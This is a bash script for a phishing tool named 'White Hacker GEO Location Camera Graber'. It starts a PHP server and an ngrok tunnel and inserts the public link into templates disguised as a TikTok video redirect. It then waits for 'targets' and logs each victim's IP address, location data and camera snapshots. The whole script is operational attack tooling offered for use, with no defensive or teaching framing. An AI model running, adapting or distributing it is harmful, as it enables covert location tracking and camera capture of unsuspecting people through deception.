#!/bin/bash
# White Hacker GEO Location Camera Graber
# Integrated: TikTok Pro Redirect, Location API, & Silent Linker

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _      _  _   _  _____  ____    _   _  ____  ____  _  _  ____  ____  \e[0m\n"
printf "\e[1;92m / \  /|/ \/ \ / \/__ __\/  __/   / \ / \/  _ \/   _\/ \/ \/  _ \/  __\ \e[0m\n"
printf "\e[1;92m | |  ||| || |_| |  / \  |  \     | |_| || / \||  /  | | //| / \||  \/| \e[0m\n"
printf "\e[1;92m | |/\||| ||  _  |  | |  |  /_    |  _  || |-|||  \_ | \// | |-|||    / \e[0m\n"
printf "\e[1;92m \_/  \|\_/\_/ \_/  \_/  \____\   \_/ \_/\_/ \|\____/\_/\_/\_/ \|\_/\_\ \e[0m\n"
printf "\e[1;93m          [ WHITE HACKER GEO LOCATION CAMERA GRABER ]          \e[0m\n"
printf " \e[1;77m Target: TikTok Pro | Tracker: Location + Camera \e[0m \n"
printf "\n"
}

stop() {
    printf "\n\e[1;31m[!] Stopping all services...\e[0m\n"
    pkill -f ngrok > /dev/null 2>&1
    pkill -f php > /dev/null 2>&1
    exit 1
}

nuclear_clean() {
    # Force kill anything on port 3333
    fuser -k 3333/tcp > /dev/null 2>&1
    pid=$(netstat -tulnp 2>/dev/null | grep :3333 | awk '{print $7}' | cut -d/ -f1)
    if [ -n "$pid" ]; then kill -9 $pid > /dev/null 2>&1; fi

    pkill -9 -f ngrok > /dev/null 2>&1
    pkill -9 -f php > /dev/null 2>&1
    sleep 1
}

payload_ngrok() {
    # Detect the link from the local Ngrok API
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\(.ngrok-free.app\|.ngrok.io\|.ngrok-free.dev\)' | head -n1)
    
    # Inject the link into the bridge files
    sed "s+forwarding_link+$link+g" template.php > index.php

    # TikTok Pro logic: Replace the placeholder with the real TikTok URL
    sed "s+forwarding_link+$link+g" tiktok.html > index3.html
    sed "s+tiktok_redir_link+$tiktok_url+g" index3.html > index2.html
    
    rm -rf index3.html > /dev/null 2>&1
}

ngrok_server() {
    # Check for manual tunnel
    manual_link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\(.ngrok-free.app\|.ngrok.io\|.ngrok-free.dev\)' | head -n1)
    if [[ -n "$manual_link" ]]; then
        printf "\e[1;92m[+] Active tunnel detected: %s\e[0m\n" $manual_link
        payload_ngrok
        checkfound
        return
    fi

    nuclear_clean
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Launching Ngrok tunnel...\n"
    ngrok http 3333 > /dev/null 2>&1 &
    
    # Waiting loop
    for i in {1..15}; do
        sleep 2
        link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\(.ngrok-free.app\|.ngrok.io\|.ngrok-free.dev\)' | head -n1)
        if [[ -n "$link" ]]; then
            printf "\e[1;92m[+] Phishing Link Generated: %s\e[0m\n" $link
            payload_ngrok
            checkfound
            return
        fi
    done
    printf "\e[1;31m[!] Failed to generate link. Check Ngrok token.\e[0m\n"
    stop
}

checkfound() {
    printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets... (Ctrl+C to stop)\e[0m\n"
    while true; do
        # 1. Detect New Victim IP and Location
        if [[ -e "ip.txt" ]]; then
            ip=$(grep -a 'IP:' ip.txt | tail -n1 | cut -d " " -f2 | tr -d '\r')
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target Hit! IP: \e[1;77m$ip\e[0m\n"
            printf "\e[1;33m[*] Location data saved to VICTIM-$ip/INFO.txt\e[0m\n"
            rm -rf ip.txt
        fi

        # 2. Detect PNG Snapshots from Camera
        if [[ -e "Log.log" ]]; then
            printf "\e[1;92m[\e[0m\e[1;77mPNG\e[0m\e[1;92m] Camera Snapshot saved.\e[0m\n"
            rm -rf Log.log
        fi
        sleep 1
    done 
}

# --- Main Execution ---
banner
read -p "[+] Enter TikTok Video URL to Redirect: " tiktok_url
ngrok_server
